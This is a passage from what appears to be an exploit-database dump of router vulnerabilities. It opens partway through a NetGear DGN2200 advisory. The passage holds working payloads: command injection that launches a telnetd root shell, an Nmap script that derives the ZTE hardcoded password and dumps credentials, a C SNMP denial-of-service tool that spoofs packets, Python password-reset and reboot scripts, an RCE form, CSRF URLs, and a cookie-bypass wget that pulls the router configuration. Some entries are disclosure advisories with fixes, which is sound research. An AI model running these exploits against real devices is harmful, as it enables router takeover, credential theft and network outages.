1. Send the following POST data:
IPAddr1=a&IPAddr2=b&IPAddr3=c&IPAddr4=d&ping=xxxx&ping_IPAddr=|/usr/sbin/telnetd -p 90 -l /bin/sh
2. Telnet to port 90
Solution
Validate untrusted user input using a whitelist of acceptable values. For example, IPv4 address values may only include the digits '0' through '9', and full stops ('.')
3.Blind Command Execution with DNS Lookup
Requires
Authenticated access to the web administration interface.
Description
The DNS lookup function available through the web interface is vulnerable to operating system command injection. An attacker with authenticated web user access can gain OS command execution privileges which can be leveraged to backdoor the router, intercept and modify internet traffic, and access connected devices.
Impact
Using this vulnerability, BAE Systems was able to execute arbitrary commands on the underlying Linux operating system but was unable to see the response.
Proof of concept
Example exploitation demonstrating the issue through use of the sleep command to delay the response from the server:
POST /dnslookup.cgi HTTP/1.1
Host: 192.168.0.1
Proxy-Connection: keep-alive
Content-Length: 32
Cache-Control: max-age=0
Authorization: Basic YWRtaW46YXBwbGU3ODE=
Origin: http://192.168.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://192.168.0.1/DIAG_diag.htm
Accept-Encoding: gzip,deflate,sdch
Accept-Language: en-GB,en-US;q=0.8,en;q=0.6
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
host_name=|sleep 5&lookup=Lookup
To get an interactive shell,
1.Send the following POST data:
hostname=|/usr/sbin/telnetd -p 90 -l /bin/sh&lookup=Lookup
2.Telnet to port 90
Solution
Validate untrusted user input using a whitelist of acceptable values. For example, hostname values may only contain uppercase or lowercase ASCII letters, the digits '0' through '9', full stops (.) and hyphens ('-').
4.No Cross-Site Request Forgery (CSRF) Protection
Requires
Luring a logged in admin user into following a malicious link
Description
An attacker can lure a user into following an untrusted link to a malicious webpage that will exploit the lack of CSRF protection by forcing the user's web browser to perform unwanted actions, such as altering firewall rules. This attack returns no information to the attacker, so it is effectively 'blind', however this does not detract from the threat.
The command execution vulnerabilities described above can be performed through CSRF.
Impact
Using this vulnerability, BAE Systems was able to update configuration of the device, including changing WPA keys, alter firewall rules and perform command execution through exploitation of the ping and DNS features.
Solution
Include an anti-CSRF token in all web forms and ensure that the token is present and correct when HTTP requests for actions are received.
5.Gearguy/Geardog Telnet Backdoor
Requires
Ability to telnet to port 23 (only on LAN side by default)
Description
There is a backdoor (feature) built into many NetGear devices, where a user can gain operating system command access without requiring a password. This issue has been previously reported in other NetGear devices.
NetGear provides a windows executable to do this. A Linux client is available from http://code.google.com/p/netgear-telnetenable/
Send a Blowfish encrypted message to port 23 from the LAN. When you reconnect, it provides a shell without a password required.
Impact
Using this vulnerability, BAE Systems was able to gain a root shell on the underlying Linux operating system without supplying any authentication credentials. This would allow complete device compromise, which can be leveraged to backdoor the router, intercept and modify internet traffic, and access connected devices.
Proof of concept
python telnet-enabler.py 192.168.0.1 ""204E7F2172C8"" Gearguy Geardog
Sent telnet enable payload to '192.168.0.1:23'
Solution
Remove the backdoor feature from the device. If a last resort admin console or reset function is required, implement it to require interaction with the device so that only a person with physical access to the device is able to use this function.
6.FTP Insecure Root Directory
Requires
FTP to be enabled (not enabled by default)
Description
The FTP server allows a user to access configuration files and to traverse outside the folder that contains files intended to be shared by FTP.
It is possible to list and retrieve files in the / folder, however the user is restricted from using the cd or CWD command to change the current directory to '/'.
Impact
Using this vulnerability, BAE Systems was able to gain access to sensitive configuration files.
Proof of concept
root@bt# ftp 192.168.0.1
Connected to 192.168.0.1.
230 User logged in.
Name (192.168.0.1:root): ftp
230 User logged in.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT 192.168.0.6:49211 OK
150 BINARY data connection established.
lrwxrwxrwx   1 nobody   root     18 Jan 01  2003 USB_Storage
226 Directory list has been submitted.
ftp> cd /
550 Error: Access Denied.
ftp> ls /
200 PORT 192.168.0.6:55927 OK
150 BINARY data connection established.
-rw-r--r--   1 nobody   root     2 Jan 01  2003 all_no_password
-rw-r--r--   1 nobody   root     1700 Jan 01  2003 bftpd.conf
drwxr-xr-x   3 nobody   root     0 Jan 01  2003 conf
-rw-r--r--   1 nobody   root     2 Jan 01  2003 lan3_time
-r--r--r--   1 nobody   root     1430 Jan 01  2003 lan_dev
-rw-r--r--   1 nobody   root     2 Jan 01  2003 lan_time
drwxr-xr-x  48 nobody   root     0 Jan 01  2003 mnt
-rw-r--r--   1 nobody   root     1 Jan 01  2003 opendns.flag
-rw-r--r--   1 nobody   root     0 Jan 01  2003 opendns.tbl
-rw-r--r--   1 nobody   root     0 Jan 01  2003 opendns_auth.tbl
drwxr-xr-x   2 nobody   root     0 Jan 01  2003 ppp
-rw-r--r--   1 nobody   root     38 Jan 01  2003 resolv.conf
-rw-r--r--   1 nobody   root     208 Jan 01  2003 ripd.conf
drwxr-xr-x   4 nobody   root     0 Jan 01  2003 samba
drwxr-xr-x   2 nobody   root     0 Jan 01  2003 shares
-rw-r--r--   1 nobody   root     262 Jan 01  2003 space_info
-rw-------   1 nobody   root     2 Oct 14 14:15 timesync
-rw-r--r--   1 nobody   root     242 Jan 01  2003 udhcpd.conf
-rw-r--r--   1 nobody   root     0 Jan 01  2003 udhcpd.leases
-rw-r--r--   1 nobody   root     4 Jan 01  2003 udhcpd.pid
-rw-r--r--   1 nobody   root     2 Jan 01  2003 udhcpd_resrv.conf
-rw-r--r--   1 nobody   root     3562 Jan 01  2003 upnp_xml
drwxr-xr-x   2 nobody   root     0 Jan 01  2003 usb_vol_name
drwxr-xr-x  11 nobody   root     0 Jan 01  2003 var
-r--r--r--   1 nobody   root     1922 Jan 01  2003 wan_dev
-rw-r--r--   1 nobody   root     3 Jan 01  2003 wan_time
drwxr-xr-x   2 nobody   root     0 Jan 01  1999 wlan
-rw-r--r--   1 nobody   root     2 Jan 01  2003 wlan_time
-rw-r--r--   1 nobody   root     0 Jan 01  2003 zebra.conf
226 Directory list has been submitted.
ftp>
ftp> get /bftpd.conf
local: ./bftpd.conf remote: /bftpd.conf
200 PORT 192.168.0.5:53750 OK
150 BINARY data connection established.
226 File transmission successful.
1454 bytes received in 0.00 secs (3256.7 kB/s)
Solution
Enforce the folder restriction to the /shares folder for all FTP commands.
7.Cannot Disable WPS
Requires
Local proximity and WiFi enabled
Description
Wi-Fi Protected Setup (WPS) is an insecure protocol vulnerable to bruteforce attacks due to design vulnerabilities. The NetGear device does not provide an effective method to disable WPS. An attacker with local proximity to the device while WiFi is enabled, can bruteforce WPS, and obtain the WPA key which allows an attacker to connect to the WiFi access point, and decrypt WiFi traffic from other users.
Software such as Reaver, can be used to brute-force the WPS key, usually within about ten hours. Reaver is available from http://code.google.com/p/reaver-wps.
The 'Advanced Wireless Settings' page contains the following section:
WPS Settings
Router's PIN:99999999
[Tickbox] Disable Router's PIN
[Tickbox] Keep Existing Wireless Settings
Ticking the 'Disable Router's PIN' box appears to have no effect.
Impact
Using this vulnerability, BAE Systems was able to crack the wireless password, and gain access to the WPA2 PSK wireless network hosted by the device.
Proof of concept
This vulnerability can be exploited with the Reaver tool available from http://code.google.com/p/reaver-wps/.
Solution
Implement a method for users to easily and effectively disable WPS.
8.Passwords Stored in Plaintext
Requires
Telnet access or exploitation of a vulnerability providing command execution
Description
The router stores passwords in the /etc/passwd file in plaintext instead of using encrypted hashes.
Impact
Using this vulnerability, BAE Systems was able to learn the passwords used to access the device.
Proof of concept
nobody:*:0:0:nobody:/:/bin/sh
admin:s3cr3tp4ssw0rd:0:0:admin:/:/bin/sh
guest:guest:0:0:guest:/:/bin/sh
Solution
Store user passwords as a non-reversible cryptographic hash, such as SHA-256.
9.Pre-Authentication Information Disclosure
Requires
Unauthenticated access to the web interface
Description
This issue has been previously reported in other NetGear devices and is the same issue reported here:
* http://websec.mx/advisories/view/Revelacion_de_informacion_en_Netgear
Impact
Using this vulnerability, BAE Systems was able to learn some identifying features of the device without needing to provide credentials.
Proof of concept
URL: http://192.168.0.1/currentsetting.htm
Firmware=V1.0.0.36_7.0.36
RegionTag=DGN2200_WW
Region=ww
Model=DGN2200
InternetConnectionStatus=Up
ParentalControlSupported=1
Solution
Restrict access to webpages containing sensitive functionality or data to authenticated users.
10.Firmware Update Vulnerable to Man In The Middle
Requires
Control of the users network, for example at the ISP level or local network.
Description
Each time an admin logs into the web interface, the web interface attempts to find new firmware on an FTP server.
FTP is an insecure protocol that is vulnerable to man-in-the-middle attacks. An attacker could provide a backdoored version of the firmware.
Updates are sourced from: ftp://14.0.34.208/dgn2200/ww/
Impact
Using this vulnerability, BAE Systems was able to provide a malicious firmware image to the router.
Solution
Retrieve updates using a protocol with SSL/TLS with certificate validation.
Apply a public key signature to firmware images and check them before usage.
End User Recommendation
Replace your NetGear router with a more recent model that can receive updated firmware.
Disclosure Time-Line
29/11/2012-Vendor notified
6/12/2012-Vendor acknowledges vulnerabilities but advises that the product is beyond its end of life and will not be patched
11/2/2014-Advisory released
Contact
Advisory URL: http://www.baesystemsdetica.com.au/Research/Advisories/NETGEAR-DGN2200-Multiple-Vulnerabilities-%28AIS-2014
Website: www.baesystems.com"
2014-02-09,WebApps,Hardware,Cesar Neira,ZTE ZXV10 W300 Router,Hard-Coded Credentials,"# Exploit Title: ZTE ZXV10 W300 router contains hardcoded credentials
# Date: 03 Feb 2014
# Exploit Author: Cesar Neira
# Vendor Homepage: http://wwwen.zte.com.cn/
# Version: ZTE ZXV10 W300 v2.1
# CVE : CVE-2014-0329
# Dork (Shodan): Basic realm=""index.htm""
# References:
http://alguienenlafisi.blogspot.com/2014/02/hackeando-el-router-zte-zxv10-w300-v21.html","local nmap = require ""nmap""
local stdnse = require ""stdnse""
local snmp = require ""snmp""
local vulns = require ""vulns""
description = [[
ZTE ZXV10 W300 router contains hardcoded credentials that are useable for the
telnet service on the device. The username is ""admin"" and the password is
""XXXXairocon"" where ""XXXX"" is the last four characters of the device's MAC
address. The MAC address is obtainable over SNMP with community string public.
author = ""Cesar Neira""
license = ""Same as Nmap--See http://nmap.org/book/man-legal.html""
categories = {""vuln"", ""exploit"", ""intrusive""}
-- @usage nmap -sU -sS -p U:161,T:23 --script=airocon example.org
-- @output
-- PORT    STATE         SERVICE
-- 23/tcp  open          telnet
-- 161/udp open|filtered snmp
-- Host script results:
-- | airocon:
-- |   VULNERABLE:
-- |   ZTE ZXV10 W300 router contains hardcoded credentials
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2014-0329
-- |     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
-- |     Description:
-- |       ZTE ZXV10 W300 router contains hardcoded credentials that are useable for the telnet
-- |       service on the device. The username is ""admin"" and the password is ""XXXXairocon""
-- |       where ""XXXX"" is the last four characters of the device's MAC address. The MAC address
-- |       is obtainable over SNMP with community string public.
-- |     Disclosure date: 2014-2-3
-- |     Exploit results:
-- |       admin:1234
-- |       support:1234
-- |       admin:0E91airocon
-- |     References:
-- |       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0329
-- |       http://alguienenlafisi.blogspot.com/2014/02/hackeando-el-router-zte-zxv10-w300-v21.html
-- |_      http://www.kb.cert.org/vuls/id/228886
-- @args community SNMP community (Default: public)
local DEFAULT_COMMUNITY = ""public""
hostrule = function(host)
local snmp_port, telnet_port
snmp_port = nmap.get_port_state(host, {number=161, protocol=""udp""})
if not snmp_port  and not (snmp_port.state == ""open"" or snmp_port.state == ""open|filtered"") then
return false
end
telnet_port = nmap.get_port_state(host, {number=23, protocol=""tcp""})
if not telnet_port and not telnet_port.state == ""open"" then
return false
end
return true
end
local get_mac = function(host, community)
local socket, status, response
socket = nmap.new_socket(""udp"")
socket:set_timeout(5000)
status, response = socket:connect(host, 161)
if not status then
socket:close()
return status, response
end
local payload, request
request = snmp.buildGetRequest({}, "".1.3.6.1.2.1.2.2.1.6.10000"")
payload = snmp.encode(snmp.buildPacket(request, 0, community))
status, response = socket:send(payload)
if not status then
socket:close()
return status, response
end
status, response = socket:receive_bytes(1)
if not status then
socket:close()
return status, response
end
socket:close()
local result
result = snmp.fetchFirst(response)
if not result then
return false, ""Unexpected response value.""
end
return true, stdnse.tohex(result)
end
local dump_creds = function(host, user, password)
local socket, status, response
socket = nmap.new_socket(""tcp"")
socket:set_timeout(5000)
status, response = socket:connect(host, 23)
if not status then
socket:close()
return status, response
end
local payload
payload = user .. ""\r"" .. password .. ""\rsh\rlogin show\rexit\r""
status, response = socket:send(payload)
if not status then
socket:close()
return status, response
end
status, response = socket:receive_buf(""exit"", false)
if not status then
socket:close()
return status, response
end
socket:close()
return true, response
end
local parse_response = function(response)
local index
index = string.find(response, ""Username +Password +Priority"")
if not index then
return false, ""Unexpected response value.""
end
index = string.find(response, ""\r\n"", index) + 2
response = string.sub(response, index)
local result, endl, line
result = {}
index = 0
endl = string.find(response, ""\r\n"", index)
while endl do
line = string.sub(response, index, endl)
line = string.gsub(line, ""\r"", """")
line = string.gsub(line, ""^ +"", """")
line = string.gsub(line, "" +$"", """")
line = string.gsub(line, "" +"", "" "")
local user, pass, prio
for user, pass, prio in string.gmatch(line, ""([^ ]+) ([^ ]+) ([^ ]+)"") do
local aux = {}
aux['username'] = user
aux['password'] = pass
aux['priority'] = prio
table.insert(result, aux)
end
index = endl + 2
endl = string.find(response, ""\r\n"", index)
end
return true, result
end
action = function(host)
local vuln = {
title = ""ZTE ZXV10 W300 router contains hardcoded credentials"",
state = vulns.STATE.NOT_VULN,
IDS = {CVE = 'CVE-2014-0329'},
risk_factor = ""High"",
scores = {
CVSSv2 = ""9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)"",
description = [[
ZTE ZXV10 W300 router contains hardcoded credentials that are useable for the telnet
service on the device. The username is ""admin"" and the password is ""XXXXairocon""
where ""XXXX"" is the last four characters of the device's MAC address. The MAC address
is obtainable over SNMP with community string public.]],
references = {
""http://www.kb.cert.org/vuls/id/228886"",
""http://alguienenlafisi.blogspot.com/2014/02/hackeando-el-router-zte-zxv10-w300-v21.html""
dates = {
disclosure = {year = 2014, month = 2, day = 3},
exploit_results = {},
local community
community = stdnse.get_script_args(SCRIPT_NAME .. "".community"") or DEFAULT_COMMUNITY
local status, response
status, response = get_mac(host, community)
if not status then
return response
end
local password
password = string.upper(string.sub(response, 9)) .. ""airocon""
status, response = dump_creds(host, ""admin"", password)
if not status then
return response
end
status, response = parse_response( response )
if not status then
return response
end
vuln.state = vulns.STATE.EXPLOIT
for _, data in pairs(response) do
table.insert(vuln.exploit_results, data.username .. "":"" .. data.password)
end
return vulns.Report:new(SCRIPT_NAME, host):make_output(vuln)
end"
2008-02-04,DoS,Hardware,ShadOS,MikroTik RouterOS 3.0,SNMP SET Denial of Service,"// source: https://www.securityfocus.com/bid/27599/info
/* --------------------------------------------------------------------------
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netdb.h>
#include <memory.h>
#include <string.h>
/* Snmp Version */
/* Community */","MikroTik RouterOS is prone to a denial-of-service vulnerability. An attacker can exploit this issue to crash an affected router, denying service to legitimate users.
This issue affects versions up to and including RouterOS 3.2.
*                          (c) ShadOS 2008
*       _  _     _ _ _  __     _      _   _
*      | || |___| | | |/ /_ _ (_)__ _| |_| |_ ___
*      | __ / -_) | | ' <| ' \| / _` | ' \  _(_-<
*      |_||_\___|_|_|_|\_\_||_|_\__, |_||_\__/__/
*        hellknights.void.ru    |___/  .0x48k.
* --------------------------------------------------------------------------
*  MicroTik RouterOS <=3.2 SNMPd snmp-set DoS exploit. Other OSs may be vulnurable (fe. Linux )
*  Don't forget to visit our site and my homepage for new releases:
*  http://hellknights.void.ru
*  http://shados.freeweb7.com
*  Also, you can mail me any bugs or suggestions:
*  mailto: shados /at/ mail /dot/ ru
*  Thanks 2 antichat.ru and all my friends.
* --------------------------------------------------------------------------
*  Copyright (C) 89, 90, 91, 1995-2007 Free Software Foundation.
*  This program is free software; you can redistribute it and/or modify
*  it under the terms of the GNU General Public License as published by
*  the Free Software Foundation; either version 2, or (at your option)
*  any later version.
*  This program is distributed in the hope that it will be useful,
*  but WITHOUT ANY WARRANTY; without even the implied warranty of
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*  GNU General Public License for more details.
*  You should have received a copy of the GNU General Public License
*  along with this program; if not, write to the Free Software Foundation,
*  Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
* --------------------------------------------------------------------------
char evilcode[] = {
0x19, 0x02, 0x02, 0x1e, 0x0c, 0x02, 0x01, 0x00, 0x02, 0x01, 0x00, 0x30, 0x0d, 0x30, 0x0b, 0x06, 0x07, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x05, 0x00, 0x00
unsigned short in_cksum(addr, len)
u_short *addr;
int len;
register int nleft = len;
register u_short *w = addr;
register int sum = 0;
u_short answer = 0;
while (nleft > 1) {
sum += *w++;
sum += *w++;
nleft -= 2;
if (nleft == 1) {
*(u_char *) (&answer) = *(u_char *) w;
sum += answer;
sum = (sum >> 17) + (sum & 0xffff);
sum += (sum >> 17);
answer = -sum;
return (answer);
int sendudp(int sock,unsigned long *saddr, unsigned long *daddr,unsigned int sport,unsigned int dport,char *data, int len)
char *packet;
struct sockaddr_in dstaddr;
struct iphdr *ip;
struct udphdr *udp;
packet = (char *)malloc(sizeof(struct iphdr)+sizeof(struct udphdr)+len);
memset(packet,0,sizeof(struct iphdr) + sizeof(struct udphdr) + len);
if (packet == NULL) { perror(""Malloc failed\n""); exit(-1); }
ip = (struct iphdr *)packet;
udp = (struct udphdr *)(packet+sizeof(struct iphdr));
ip->saddr = *saddr;
ip->daddr = *daddr;
ip->version = 4;
ip->ihl = 5;
ip->ttl = 255;
ip->id = htons((unsigned short) rand());
ip->protocol = IPPROTO_UDP;
ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr)+len);
ip->check = in_cksum(ip, sizeof(struct iphdr));
udp->source = htons(sport);
udp->dest = htons(dport);
udp->len = htons(sizeof(struct udphdr) + len);
memcpy(packet+(sizeof(struct iphdr) + sizeof(struct udphdr)),data,len);
dstaddr.sin_family = AF_INET;
dstaddr.sin_addr.s_addr = *daddr;
if (sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct udphdr)+len,0,(struct sockaddr *)&dstaddr,sizeof(struct sockaddr_in)) < 0)
perror(""sendto() failed"");
free(packet);
char * makereq(char *community,int *size)
char *buf;
char *ptr;
int len;
int i;
len = 5 + strlen(community) + sizeof(evilcode);
buf = (char *)malloc(len);
ptr = buf;
*ptr++ = 0x30;
*ptr++ = len;
*ptr++ = 0x02;
*ptr++ = 0x01;
*ptr++ = 0x00;
*ptr++ = 0x04;
*ptr++ = strlen(community);
strcpy(ptr,community);
ptr = ptr + strlen(community);
*ptr++ = 0xa3; /* Set Request */
memcpy(ptr, evilcode, sizeof(evilcode));
ptr = ptr + sizeof(evilcode);
*size = len+2;
return buf;
int erexit(char *msg)
printf(""%s\n"",msg);
exit (-1) ;
int usage()
printf(""Usage: ./snmpdos <-s source> <-d dest> <-c community>\n"");
int main(int argc, char **argv)
char *saddr,*daddr,*community;
unsigned char *buf;
int size;
int sock;
unsigned long lsaddr,ldaddr;
int i;
saddr = NULL;
daddr = NULL;
if (argc != 7) { usage(); erexit(""not enough args\n""); }
if (!strcmp(argv[1],""-s""))
saddr = strdup(argv[2]);
if (!strcmp(argv[3],""-d""))
daddr = strdup(argv[4]);
if (!strcmp(argv[5],""-c""))
community = strdup(argv[6]);
printf(""Ok, spoofing packets from %s to %s\n"",saddr,daddr);
if (inet_addr(saddr) == -1 || inet_addr(daddr) == -1)
erexit(""Invalid source/destination IP address\n"");
if (saddr == NULL) { usage(); erexit(""No Source Address""); }
if (daddr == NULL) { usage(); erexit(""No Dest Address""); }
sock = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
if (sock == -1)
erexit(""Couldnt open Raw socket!(Are you root?)\n"");
lsaddr = inet_addr(saddr);
ldaddr = inet_addr(daddr);
buf = makereq(community,&size);
sendudp(sock,&lsaddr,&ldaddr,32788,161,buf,size);
fprintf(stdout,""Sent packet. SNMPd must be down.\n"");
return 0;"
2014-01-20,WebApps,Hardware,KAI,BLUE COM Router 5360/52018,Password Reset,"# Exploit Title: BLUE COM Router - 5360/52018 Password Reset Exploit
# Date: 20/1/2013
# Exploit Author: KAI (kaisai12)
# Home: CEH.VN
# Version: BCOM - 5360
# vulnerability - change password easy ! no protect !
#var loc = 'password.cgi?';
#switch ( idx ) {
#         case 2:
#            loc += 'sptPassword=' + encodeUrl(pwdNew.value);
#            break;
#         case 3:
#            loc += 'usrPassword=' + encodeUrl(pwdNew.value);
#            break;
#         default:
#            loc += 'sysPassword=' + encodeUrl(pwdNew.value);
#            break;
#      }
#      var code = 'location=""' + loc + '""';
#      eval(code);
#   }","import urllib
import sys
def attackrouter(ip,password):
try:
params = urllib.urlencode({'sysPassword': str(password)})
f = urllib.urlopen(""http://""+ip+""/password.cgi?%s"" % params)
print ""[+] IP: %s - Reset password: %s"" % (ip,password)
return
except:
print ""[-] error""
def main():
if len(sys.argv) > 2:
ip = sys.argv[1]
password = sys.argv[2]
print ""--------------------------------------------------""
print ""Router BCOM Exploit Execute Reset password modem  ""
print ""                             author: KAI(CEH>VN)  ""
print ""--------------------------------------------------""
print ""[+] Sending exploit: OK""
attackrouter(ip,password)
else:
print ""[-] Command error""
print ""[-] Use:bluecomRT.py <ip> <password>""
if __name__ == '__main__':
main()"
2008-01-30,Remote,Hardware,Oligarchy Oligarchy,2WIRE Routers,'H04_POST' Access Validation,"source: https://www.securityfocus.com/bid/27516/info
http://www.example.com/xslt?PAGE=H04_POST&PASSWORD=admin&PASSWORD_CONF=admin","Multiple 2Wire routers are prone to an access-validation vulnerability because they fail to adequately authenticate users before performing certain actions.
Unauthenticated attackers can leverage this issue to change the password of arbitrary user accounts on the router. Successful attacks will completely compromise affected devices.
2Wire routers that have the 'H04_POST' page are affected by this issue.
UPDATE: This BID has been retired because it has been found to be a duplicate of BID 27246 (2Wire Routers Cross-Site Request Forgery Vulnerability).
UPDATE (February 1, 2008): This BID is being reinstated. Further investigation and new information reveal that this vulnerability differs from the one described in BID 27246."
2008-01-21,WebApps,CGI,WarGame,Alice Gate2 Plus Wi-Fi Router,Cross-Site Request Forgery,"source: https://www.securityfocus.com/bid/27374/info
http://www.example.com/cp06_wifi_m_nocifr.cgi?wlChannel=Auto&wlRadioEnable=on","Alice Gate2 Plus Wi-Fi routers are prone to a cross-site request-forgery vulnerability.
An attacker can exploit this issue to alter administrative configuration on affected devices. Specifically, altering the wireless encryption settings on devices has been demonstrated. Other attacks may also be possible."
2008-01-15,Remote,Hardware,hkm,2WIRE Routers,Cross-Site Request Forgery,"source: https://www.securityfocus.com/bid/27246/info
http://192.168.1.254/xslt?PAGE=A05_POST&THISPAGE=A05&NEXTPAGE=A05_POST&ENABLE_PASS=on&PASSWORD=NUEVOPASS&PASSWORD_CONF=NUEVOPASS
http://192.168.1.254/xslt?PAGE=J38_SET&THISPAGE=J38&NEXTPAGE=J38_SET&NAME=www.example.com&ADDR=127.0.0.1
http://192.168.1.254/xslt?PAGE=C05_POST&THISPAGE=C05&NEXTPAGE=C05_POST&NAME=encrypt_enabled&VALUE=0
http://192.168.1.254/xslt?PAGE=J05_POST&THISPAGE=J05&NEXTPAGE=J05_POST&IP_DYNAMIC=TRUE","Multiple 2Wire routers are prone to a cross-site request-forgery vulnerability.
Exploiting this issue may allow a remote attacker to execute arbitrary actions on an affected device.
Set a password (NUEVOPASS):
Add names to the DNS:
Disable Wireless Authentication
Set Dynamic DNS"
2014-01-14,WebApps,Hardware,Arash Abedian,Feixun Wireless Router FWR-604H,Remote Code Execution,"# Exploit Title: [Feixun FWR-604H Wireless Router Remote Code Execution]
# Date: [2014-01-09]
# Exploit Author: [Arash Abedian
# Vendor Homepage: [http://feixun.com.cn]
# Version: [Hardware Version 1.0, Firmware Build: 7642]
# Tested on: [Hardware Version 1.0, Firmware Build: 7642]
# Vulnerability Details:","(http://www.exploit-db.com/author/?a=6187<http://www.exploit-db.com/author/?a=6187)>
Feixun FWR-604H 150Mbps Wireless N Router is vulnerable to Remote Code
Execution vulnerability(Hardware Version 1.0, Firmware Build: 7642, Vendor
website:feixun.com.cn). The web server don't authenticate user prior to
system level execution. As such an unauthenticated attacker can easily
remotely exploit the target using system_command parameter in diagnosis.asp
file.
<html>
<body>
Exploit Feixun FWR-604H
<FORM ACTION=""http://192.168.1.1/diagnosis.asp"" METHOD=POST>
<input type=""hidden"" name=""doType"" value=""2"">
Command: <input type=""text"" name=""system_command"">
<input type=""hidden"" name=""diagnosisResult"" value="""">
<input type=""submit"" value=""Exploit"">
</FORM>
</body>
</html>"
2014-01-04,DoS,Hardware,nicx0,Motorola SBG6580 Cable Modem & Wireless Router,Reboot (Denial of Service),"# Exploit Title: Motorola SBG6580 Cable Modem & Wireless-N Router Denial of Service
# Date: 01/03/14
# Exploit Author: nicx0
# Vendor Homepage: http://www.motorola.com/
# Software Link: http://www.motorola.com/us/SBG6580-SURFboard%C2%AE-eXtreme-Wireless-Cable-Modem/70902.html
# Version: SBG6580-6.5.0.0-GA-00-226-NOSH
# POSTing a bad login page parameter causes the router to reboot.","import sys
import socket
import urllib2
import urllib
router_ip = ''
try:
router_ip = str(sys.argv[1])
except:
print 'motobug.py ip_address : e.g. motobug.py 192.168.0.1'
sys.exit(2)
query_args = {'this_was':'too_easy'}
url = 'http://' + router_ip + '/goform/login'
post_data = urllib.urlencode(query_args)
request = urllib2.Request(url, post_data)
try:
print '[+] Sending invalid POST request to ' + url + '...'
response = urllib2.urlopen(request,timeout=5)
except socket.timeout:
print '[+] Success! No response from the modem.'
except urllib2.HTTPError:
print '[-] Failed: HTTP error received. The modem might not be a SBG6580.'
except urllib2.URLError:
print '[-] Failed: URL error received. Check the IP address again..'
else:
print '[-] Failed: HTTP response received. Modem does not appear to be vulnerable.'"
2014-01-03,WebApps,Hardware,Amplia Security Advisories,Nisuta NS-WIR150NE / NS-WIR300N Wireless Routers,Remote Management Web Interface Authentication Bypass,"http://www.nisuta.com/producto.asp?id=NSWIR150NE
http://www.nisuta.com/drivers/NSWIR150NE.rar
http://www.nisuta.com/producto.asp?id=NSWIR150NF
http://www.nisuta.com/drivers/NSWIR150NF.rar
// Nisuta NS-WIR150NE, NS-WIR300N Wireless Routers Remote Management Web Interface Authentication Bypass Vulnerability
// Amplia Security - Amplia Security Research Advisory (AMPLIA-ARA050913)
// PoC exploit - dumps the router's configuration files which includes the management interface password
// and other information
// compile: javac poc.java
// run: java poc > router.cfg","Nisuta NS-WIR150NE, NS-WIR300N Wireless Routers Remote Management Web Interface Authentication Bypass Vulnerability
Amplia Security - Amplia Security Research Advisory (AMPLIA-ARA050913)
Advisory ID: AMPLIA-ARA050913
Advisory URL: <tbd>
Date Published: 12-26-2013
Vendors Contacted: Nisuta (www.nisuta.com)
Release Mode: Coordinated Release
Last Updated: 12-25-2013
Index
1. Vulnerability Information
2. Vulnerability Description
3. Vulnerable Systems
4. Vendor Information, solutions and workarounds
5. Credits
6. Technical Description
7. Disclaimer
1.Vulnerability Information
Impact: Remote attackers can bypass authentication and access the router's management web interface obtaining complete control of the device
Remotely Exploitable: Yes
Bugtraid Id: <unknown>
CVE: <unknown>
2.Vulnerability Description
The Nisuta (www.nisuta.com) NS-WIR150NE and NS-WIR300N wireless routers provide a remote management web interface available both on the WAN (not enabled by default) and LAN interfaces (enabled by default).
This remote management web interface requires a password.
A remote attacker can bypass authentication and gain access to the remote management web interface, taking control of the device, without knowing the password.
3.Vulnerable Systems
Nisuta NS-WIR150NE wireless router, firmware v5.07.41
Nisuta NS-WIR300N wireless router, firmware v5.07.36_NIS01 (hardware version v3.0)
and probably other Nisuta wireless routers with similar firmware.
4.Vendor Information, Solutions and Workarounds
The vendor made available the following firmware updates:
Nisuta NS-WIR150NE
Nisuta NS-WIR150NF
Nisuta NS-WIR300N
No firmware update is available. The router remains vulnerable.
The fix implemented by the vendor is not optimal, although better than any workaround.
As a workaround, disable remote management on the WAN interface (not enabled by default).  However, it is not possible to disable remote management on the LAN interface, and
applying the fix is recommended.
It is possible to restrict remote management on the WAN interface based on source IP address, but given the critical nature of this vulnerability we do not recommend it as a workaround.
It is also worth mentioning that the remote management web interface works over http without encryption, even with the flaw described in this advisory fixed, the interface is still insecure for other reasons.
5.Credits
This vulnerability was discovered by Amplia Security Research.
We thank Nisuta for their efforts to try to fix this vulnerability and improve the security of their products.
6. Technical Description
The Nisuta NS-WIR150NE and NS-WIR300N wireless routers provide a remote management web interface available both on the WAN (not enabled by default) and LAN interfaces (enabled by default).
This remote management web interface requires a password and uses form-based authentication (performed over http without encryption, which is another issue).
After entering the correct password, the router's remote management web interface always sets the same cookie, shown next:
Set-Cookie: admin:language=en; path=/
This cookie is hard-coded and obviously insecure.
Using this cookie in a HTTP request is enough to ""bypass authentication"" and login to the remote management web interface as an administrator without knowing the password.
The 'admin' value is not even required.  For example,
Cookie: :language=en; path=/
is enough to gain access to the router.
PoC Exploit:
An unauthenticated remote attacker on the WAN and LAN interfaces can perform any action available on the router's remote management web interface, as an example, the following command will bypass authentication and download the router's configuration which includes the current remote management web interface password among other confidential information:
$ wget --header=""Cookie: :language=en"" http://192.168.2.1/cgi-bin/DownloadCfg/config.cfg -t 1
The password is in the 'http_passwd' variable:
$ grep http_passwd config.cfg
http_passwd=mysecretpassword
